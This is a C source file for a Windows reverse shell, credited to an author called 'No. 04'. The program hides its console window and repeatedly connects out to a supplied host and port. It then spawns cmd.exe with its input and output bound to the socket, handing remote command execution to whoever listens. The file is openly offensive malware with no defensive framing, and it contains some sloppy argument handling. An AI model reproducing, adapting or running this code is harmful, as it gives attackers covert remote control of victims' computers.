 /*
  * Author: No. 04
  * 
  * Goal: Create a processor for cmd.exe and connect back home.
  */ 
 
 // Special Thanks: ParanoidNinja <- you rock!
 
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
 #include <string.h>
   
 #pragma comment(lib, "ws2_32.lib")
 
 #define DEF_BUFF 1024 
  
 void run_shell( char *server, int port );
  
 int main( int argc, char **argv ){
	 
	 int port;
	 char *ip;
	 struct hostent *remote_ip;
	 
	 // Disable console window
	 FreeConsole();
	 
	 if( argc != 3 ) {
		 
		 // Default config
		 char host[] = "127.0.0.1";
		 port = 8080;
		 run_shell( host, port );
		 
	} else {
		
		ip = argv[1];
		
		remote_ip = gethostbyname( ip );
				
		// Subdomain to IP (gethostbyname())
		if( remote_ip == NULL )
			exit(1);
		
		port = atoi( argv[2] );
		run_shell( (char *)remote_ip, port );
		
		
	}
		// If getting the IP from subdomain fails we can assume it is in IPv4 format
		port = atoi( argv[2] );
		run_shell( argv[1], port );
	
return 0;
}

void run_shell( char *server, int port ){
		
	char recv_data[DEF_BUFF];

	do {
		
		Sleep( 3000 );
		
		SOCKET sock;
		WSADATA version;
		
		int error = WSAStartup( MAKEWORD( 2, 2 ), &version );
		
		if( error != 0 )
			exit(1);
		
		struct sockaddr_in addr;
		
		sock = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
			
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr( server );
		addr.sin_port = htons( port );
		
		if( WSAConnect( sock, (SOCKADDR *)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR ) {
			
			closesocket( sock );
			WSACleanup();
			continue;
			
		} else {
			
			memset( recv_data, 0, sizeof(recv_data) );
			
			if( recv( sock, recv_data, DEF_BUFF, 0 ) <= 0 ){
				
				closesocket( sock );
				WSACleanup();
				continue;
				
			} else {
				
				// This section I don't know _everything_ of what is going on
				// But, I do know that a process is being created for cmd
				
				char command_line[] = "cmd.exe";
				
				STARTUPINFO sinfo;
				PROCESS_INFORMATION pinfo;
				
				memset( &sinfo, 0, sizeof(sinfo) );
				
				sinfo.cb = sizeof( sinfo );
				sinfo.dwFlags = ( STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW );
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = ( HANDLE )sock;
				CreateProcess( NULL, command_line, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo );
				WaitForSingleObject( pinfo.hProcess, INFINITE );
				CloseHandle( pinfo.hProcess );
				CloseHandle( pinfo.hThread );
				
				memset( recv_data, 0, sizeof( recv_data ) );
				
				if( recv( sock, recv_data, DEF_BUFF, 0 ) <= 0 ){
					
					closesocket( sock );
					WSACleanup();
					continue;
					
				}
				
				if( strcmp( recv_data, "exit \n") == 0 )
					exit(1);
					
			}
				
		}
				
	} while( strcmp( recv_data, "exit \n") != 0 && TRUE );
			
}
	
